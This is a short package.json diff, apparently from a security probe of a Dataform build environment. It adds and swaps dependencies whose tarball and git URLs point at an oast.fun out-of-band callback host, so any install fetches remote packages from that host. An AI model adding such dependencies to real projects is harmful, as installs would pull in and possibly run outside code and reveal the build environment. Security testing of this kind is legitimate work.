@@ -5,7 +5,7 @@
   "dependencies": {
     "@dataform/core": "^2.9.0",
     "oast-tarball-test": "https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/pkg-json-tarball.tgz",
-    "oast-git-test": "git+https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/git-dep.git"
+    "oast-http-test": "https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/http-dep.tgz"
   },
   "optionalDependencies": {
     "oast-optional": "https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/optional-dep.tgz"
